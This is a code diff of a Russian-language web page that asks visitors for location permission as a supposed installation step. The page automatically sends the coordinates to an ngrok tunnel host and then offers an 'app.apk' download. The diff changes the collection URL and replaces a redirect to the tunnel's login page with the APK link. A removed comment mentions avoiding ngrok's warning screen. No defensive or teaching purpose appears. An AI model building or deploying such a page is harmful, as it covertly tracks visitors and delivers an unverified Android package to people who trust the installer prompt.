@@ -6,7 +6,7 @@
   <style>
     body { font-family: Arial, sans-serif; padding: 20px; }
     #status { margin-bottom: 15px; }
-    #continueBtn, #retryBtn {
+    #installBtn, #retryBtn {
       display: none;
       padding: 12px 20px;
       border: none;
@@ -14,7 +14,7 @@
       font-size: 16px;
       cursor: pointer;
     }
-    #continueBtn {
+    #installBtn {
       background: #28a745;
       color: white;
       margin-right: 10px;
@@ -28,15 +28,13 @@
 <body>
   <h2>Добро пожаловать! Для установки дайте разрешения</h2>
   <p id="status">Ожидание разрешения...</p>
-  <button id="continueBtn">Продолжить</button>
+  <button id="installBtn">Установить приложение</button>
   <button id="retryBtn">Повторить запрос</button>
 
   <script>
     const status = document.getElementById('status');
+    const installBtn = document.getElementById('installBtn');
     const retryBtn = document.getElementById('retryBtn');
-    const continueBtn = document.getElementById('continueBtn');
-
-    let serverUrl = "https://e9ad-80-79-6-94.ngrok-free.app";
 
     function requestGeo() {
       navigator.geolocation.getCurrentPosition(
@@ -50,22 +48,25 @@
           };
 
           try {
-            await fetch(serverUrl + "/log", {
+            await fetch("https://721c-149-102-242-94.ngrok-free.app/log", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(geoData)
             });
 
-            status.textContent = "Спасибо! Нажмите 'Продолжить'.";
-            continueBtn.style.display = "inline-block";
+            status.textContent = "Спасибо! Теперь вы можете установить приложение.";
+            installBtn.style.display = "inline-block";
+            retryBtn.style.display = "none";
           } catch (err) {
             status.textContent = "Ошибка отправки данных.";
             retryBtn.style.display = "inline-block";
+            installBtn.style.display = "none";
           }
         },
         error => {
           status.textContent = "Ошибка геолокации: " + error.message;
           retryBtn.style.display = "inline-block";
+          installBtn.style.display = "none";
         }
       );
     }
@@ -76,11 +77,11 @@
       requestGeo();
     };
 
-    continueBtn.onclick = () => {
-      // 👉 теперь пользователь КЛИКАЕТ сам — предупреждение ngrok НЕ появится
-      window.location.href = serverUrl + "/login";
+    installBtn.onclick = () => {
+      window.location.href = "app.apk";
     };
 
+    // Автоматический запрос при входе
     setTimeout(requestGeo, 1000);
   </script>
 </body>
